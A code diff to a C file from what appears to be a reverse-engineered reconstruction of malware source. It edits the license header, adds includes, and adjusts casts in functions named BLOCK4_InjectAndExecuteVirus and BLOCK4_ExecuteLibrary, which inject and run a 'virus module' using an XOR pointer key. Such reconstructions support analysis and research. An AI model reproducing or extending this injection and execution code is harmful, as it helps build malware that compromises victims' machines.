@@ -1,5 +1,5 @@
 /******************************************************************************************
-  Copyright 2012-2013 Christian Roggia
+  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>
 
    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
@@ -15,6 +15,10 @@
 ******************************************************************************************/
 
 #include "C. CodeBlock.h"
+#include "8. AssemblyBlock1.h"
+#include "9. AssemblyBlock2.h"
+
+#include "config.h"
 
 // 98% (C) CODE MATCH
 INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
@@ -32,7 +36,7 @@ INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
 	
 	BLOCK4_memcpy(&sInfoBlockCopy, pVirusModuleSection, sizeof(GENERAL_INFO_BLOCK));
 	
-	sInfoBlockCopy.OriginalAddress = ((UINT32)&sInfoBlockCopy ^ XADDR_KEY);
+	sInfoBlockCopy.OriginalAddress = (DWORD)&sInfoBlockCopy ^ X_PTR_KEY;
 	sInfoBlockCopy.UnknownZero0 = 0;
 	sInfoBlockCopy.AlignAddressesFunction = sASMCodeBlocksHeader->AlignAddresses;
 	
@@ -82,7 +86,7 @@ INT32 BLOCK4_ExecuteLibrary(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
 	if(pLibraryExecEntry)
 	{
 		// Note: Same arguments passed to the 15th function of the internal library, maybe it was another module loaded in the past?
-		((__tLibraryExecEntry)pLibraryExecEntry)(pVirusModuleSection->UnknownSegment.SegmentAddress, pVirusModuleSection->UnknownSegment.SegmentSize);
+		((__tLibraryExecEntry)pLibraryExecEntry)((LPVOID)pVirusModuleSection->UnknownSegment.SegmentAddress, pVirusModuleSection->UnknownSegment.SegmentSize);
 		return 0;
 	}
 	
